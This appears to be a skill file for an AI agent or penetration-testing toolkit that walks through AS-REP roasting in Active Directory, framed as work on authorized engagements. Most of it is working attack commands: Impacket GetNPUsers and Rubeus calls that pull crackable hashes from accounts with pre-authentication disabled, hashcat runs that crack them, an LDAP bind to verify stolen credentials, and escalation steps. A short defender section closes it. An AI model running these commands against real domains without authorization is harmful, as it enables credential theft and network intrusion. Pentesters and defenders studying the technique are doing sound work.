---
name: asrep-roast-execution
description: Use when hunting Active Directory accounts with Kerberos
  pre-authentication disabled on an authorized engagement. Covers finding
  roastable accounts without credentials, requesting AS-REP hashes, and
  cracking them offline. Use when you have network access but no domain
  credentials yet, when kerberos-enum found pre-auth disabled accounts, or
  when you need an initial foothold from a crackable hash.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
parent: kerberoasting
requires: [kerberoasting]
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: Impacket
    version: 0.11.0
  - name: Hashcat
    version: 6.2.6
  - name: Python
    version: 3.12
---

AS-REP roasting needs no credentials at all: accounts with Kerberos
pre-authentication disabled hand you a crackable hash in response to a
single request. It is the best pre-authentication attack in AD and often
the first foothold. This skill covers finding those accounts and roasting
them on authorized engagements, from discovery through cracking to the
first authenticated steps.

## Quick Workflow

1. Build or confirm the username list (see kerberos-enum).
2. Request AS-REP hashes for the list without authenticating.
3. Collect the hashes in Hashcat format ($krb5asrep$).
4. Crack with targeted wordlists and rules first.
5. Verify each cracked credential with a real bind.
6. Use the foothold to start authenticated enumeration.
7. Report the misconfigured accounts individually.

## 1. Finding and roasting

```bash
# GetNPUsers: no credentials needed, outputs Hashcat-ready hashes
python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
  -dc-ip 10.0.5.10 -usersfile /tmp/valid_users.txt \
  -format hashcat -outputfile /tmp/asrep.txt
cat /tmp/asrep.txt

# Single user test when you suspect one account
python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
  -dc-ip 10.0.5.10 -usersfile /tmp/one_user.txt -format hashcat
```

```powershell
# Rubeus equivalent on Windows
Rubeus.exe asreproast /user:testuser /outfile:C:\temp\asrep.txt
```

Every hash in the output is an account the domain misconfigured. There
is no noise-versus-signal judgment here: pre-auth disabled is always a
finding, whether or not the hash cracks.

## 2. Cracking and verifying

```bash
# Hashcat mode 18200 = Kerberos 5 AS-REP
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -o /tmp/asrep_cracked.txt --status

# These accounts often have weak passwords (that is why pre-auth was
# disabled for some legacy need); targeted lists work well
hashcat -m 18200 /tmp/asrep.txt /tmp/targeted.txt -o /tmp/asrep_cracked2.txt

# Verify immediately: bind as the cracked user
python3 /opt/impacket/examples/ldapsearch.py \
  corp.example/testuser:'CrackedPass!' -dc-ip 10.0.5.10 \
  -request "(objectClass=user)" -attributes sAMAccountName 2>&1 | head -5
```

A cracked AS-REP account is a full domain user credential: it unlocks
authenticated LDAP, SMB, and the kerberoast-execution phase. Treat it as
the foothold it is and move fast but carefully.

## Edge cases

- No accounts have pre-auth disabled. The domain is configured
  correctly here; note the negative result and move to other foothold
  techniques.
- The hash cracks but the account is disabled or expired. Still a
  finding about the configuration, but not a foothold; report both
  facts.
- GetNPUsers returns errors for every user. Check the DC address, the
  domain name spelling, and network reachability to port 88 before
  concluding anything.
- The account needs pre-auth for a reason (legacy system). Note the
  business reason if the client states one, but the risk stands until
  the account is fixed or isolated.

## Escalation

- The cracked account has interesting group membership: escalate to
  full authenticated enumeration (ldap-enumeration) immediately.
- Nothing cracks: keep the hashes; longer wordlist runs can continue
  in the background while the engagement proceeds elsewhere.
- You need more usernames to test: return to kerberos-enum for a wider
  validated list.

## Detection and defender view

Defenders see AS-REP roasting as AS-REQ packets without pre-authentication
data, which normal clients never send. It is one of the easiest attacks
to detect at the KDC. The defense is absolute: enable Kerberos
pre-authentication on every account with no exceptions, and alert on any
pre-auth-less AS-REQ as an attack in progress. There is no legitimate
reason for the pattern in modern environments.

## Key references

- MITRE ATT&CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP
  Roasting).
- CWE-287 (Improper Authentication).
- Impacket GetNPUsers documentation.
